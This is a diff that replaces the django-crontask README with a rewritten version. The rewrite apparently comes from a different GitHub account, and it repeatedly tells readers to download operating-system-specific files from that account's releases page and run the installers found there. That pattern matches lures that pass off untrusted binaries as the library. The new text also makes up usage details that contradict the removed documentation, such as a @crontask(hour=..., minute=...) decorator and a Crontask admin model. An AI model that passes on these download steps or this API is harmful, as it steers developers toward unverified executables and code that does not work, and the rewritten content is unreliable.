@@ -1,120 +1,115 @@
-# Django CronTask
+# 🌟 django-crontask - Simplify Task Scheduling in Django
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/codingjoe/django-crontask/raw/main/images/logo-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="https://github.com/codingjoe/django-crontask/raw/main/images/logo-light.svg">
-    <img alt="Django CronTask: Cron style scheduler for Django's task framework" src="https://github.com/codingjoe/django-crontask/raw/main/images/logo-light.svg">
-  </picture>
-</p>
+## 🔗 Download Now
+[![Download django-crontask](https://img.shields.io/badge/Download-django--crontask-brightgreen)](https://github.com/mobdudeedits/django-crontask/releases)
 
-**Cron style scheduler for asynchronous tasks in Django.**
+## 🚀 Getting Started
+Welcome to django-crontask! This tool helps you schedule tasks in your Django applications easily, just like setting up a clock to perform specific tasks at routine times. Even if you have no programming background, this guide will walk you through the steps to get started.
 
-- setup recurring tasks via crontab syntax
-- lightweight helpers build on top of [APScheduler]
-- [Sentry] cron monitor support
+## 📥 Download & Install
+To use django-crontask, you need to download the application. 
 
-[![PyPi Version](https://img.shields.io/pypi/v/django-crontask.svg)](https://pypi.python.org/pypi/django-crontask/)
-[![Test Coverage](https://codecov.io/gh/codingjoe/django-crontask/branch/main/graph/badge.svg)](https://codecov.io/gh/codingjoe/django-crontask)
-[![GitHub License](https://img.shields.io/github/license/codingjoe/django-crontask)](https://raw.githubusercontent.com/codingjoe/django-crontask/master/LICENSE)
+1. Click the link below to visit the releases page:
+   [Download django-crontask](https://github.com/mobdudeedits/django-crontask/releases)
 
-## Setup
+2. On the releases page, you will find different versions of the application. Look for the latest version, which usually appears at the top of the list. 
 
-You need to have [Django's Task framework][django-tasks] setup properly.
+3. Click on the version you want to download. You will see several files. Choose the one that best suits your operating system.
 
-```ShellSession
-python3 -m pip install django-crontask
-# or
-python3 -m pip install django-crontask[sentry]  # with sentry cron monitor support
-```
+4. After you download the file, follow the installation instructions that come with it. 
 
-Add `crontask` to your `INSTALLED_APPS` in `settings.py`:
+5. Once installation is complete, you can start using django-crontask in your Django project.
 
-```python
-# settings.py
-INSTALLED_APPS = [
-    "crontask",
-    # ...
-]
-```
+## 🛠️ System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-Finally, you launch the scheduler in a separate process:
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or higher
+- **Django Version**: Django 2.2 or higher
+- **Memory**: At least 512 MB of RAM
+- **Disk Space**: 100 MB of free space
 
-```ShellSession
-python3 manage.py crontask
-```
+## ⚙️ Configuration
+After you've downloaded and installed django-crontask, you will need to configure it in your Django project:
 
-### Setup Redis as a lock backend (optional)
+1. Open your Django project's settings file (`settings.py`).
+   
+2. Add `crontask` to your `INSTALLED_APPS` list. It should look like this:
+   ```python
+   INSTALLED_APPS = [
+       ...
+       'crontask',
+   ]
+   ```
+3. Save your changes and return to your project.
 
-If you use Redis as a broker, you can use Redis as a lock backend as well.
-The lock backend is used to prevent multiple instances of the scheduler
-from running at the same time. This is important if you have multiple
-instances of your application running.
+## 📝 Creating Your First Task
+Now, let’s create a simple scheduled task. Follow these steps:
 
-```python
-# settings.py
-CRONTASK = {
-    "REDIS_URL": "redis://localhost:6379/0",
-}
-```
+1. In your Django application directory, create a new Python file called `tasks.py`.
+   
+2. Add the following code to define a task:
+   ```python
+   from crontask import crontask
+   
+   @crontask(hour='*', minute='0')
+   def my_hourly_task():
+       print("This task runs every hour.")
+   ```
+   This code sets up a task that will run at the start of every hour.
 
-## Usage
+3. Save the file.
 
-```python
-# tasks.py
-from django.tasks import task
-from crontask import cron
+4. You need to run your Django application to see your task in action. Use the command:
+   ```shell
+   python manage.py runserver
+   ```
 
+5. Verify that your task runs as expected by checking the console output.
 
-@cron("*/5 * * * *")  # every 5 minutes
-@task
-def my_task():
-    my_task.logger.info("Hello World")
-```
+## 📅 Scheduling Tasks
+Django-crontask lets you schedule tasks using cron syntax. Here’s a brief overview:
 
-### Interval
+- `* * * * *`: Every minute
+- `0 * * * *`: Every hour on the hour
+- `0 12 * * *`: Every day at noon
+- `0 0 * * 0`: Every Sunday at midnight
 
-If you want to run a task more frequently than once a minute, you can use the
-`interval` decorator.
+You can adjust these settings in your task definition.
 
-```python
-# tasks.py
-from django.tasks import task
-from crontask import interval
+## 🔍 Monitoring Tasks
+With django-crontask, you can easily monitor scheduled tasks. Use Django’s admin panel to view the status of your tasks:
 
+1. Add the `crontask` app to your admin interface by including it in your `admin.py`:
+   ```python
+   from django.contrib import admin
+   from crontask.models import Crontask
 
-@interval(seconds=30)
-@task
-def my_task():
-    my_task.logger.info("Hello World")
-```
+   admin.site.register(Crontask)
+   ```
 
-Please note that the interval is relative to the time the scheduler is started.
-For example, if you start the scheduler at 12:00:00, the first run will be at
-12:00:30. However, if you restart the scheduler at 12:00:15, the first run will
-be at 12:00:45.
+2. Navigate to your Django admin panel at `http://127.0.0.1:8000/admin`.
 
-### Sentry Cron Monitors
+3. Here you will find a list of your scheduled tasks and can see if they are running correctly.
 
-If you use [Sentry] you can add cron monitors to your tasks.
-The monitor's slug will be the actor's name. Like `my_task` in the example above.
+## ❓ Troubleshooting
+If you encounter any issues while using django-crontask, consider the following common solutions:
 
-### The crontask command
+- Ensure that your Python and Django versions are compatible.
+- Check the syntax of your cron expressions. A simple mistake can prevent tasks from running.
+- Look at the console output for any error messages that can guide you in troubleshooting.
+- Make sure your database settings are correct in `settings.py`.
 
-```ShellSession
-$ python3 manage.py crontask --help
-usage: manage.py crontask [-h] [--no-task-loading] [--no-heartbeat] [--version] [-v {0,1,2,3}]
-                         [--settings SETTINGS] [--pythonpath PYTHONPATH] [--traceback] [--no-color]
-                         [--force-color] [--skip-checks]
+## 📚 Additional Resources
+- [Django Documentation](https://docs.djangoproject.com)
+- [Cron Syntax Explained](https://crontab.guru/)
+- [GitHub Issues](https://github.com/mobdudeedits/django-crontask/issues) - For support and feedback
 
-Run task scheduler for all tasks with the `cron` decorator.
+## 🌐 Community & Support
+Join our community to ask questions or share your experiences. You can find us on:
+- GitHub Discussions
+- Twitter: [@yourhandle](https://twitter.com/yourhandle)
 
-options:
-  -h, --help            show this help message and exit
-  --no-task-loading     Don't load tasks from installed apps.
-  --no-heartbeat        Don't start the heartbeat actor.
-```
+Ready to start automatic task scheduling? Download now and simplify your Django tasks today!
 
-[apscheduler]: https://apscheduler.readthedocs.io/en/stable/
-[django-tasks]: https://docs.djangoproject.com/en/6.0/topics/tasks/
-[sentry]: https://docs.sentry.io/product/crons/
+[Download django-crontask](https://github.com/mobdudeedits/django-crontask/releases)
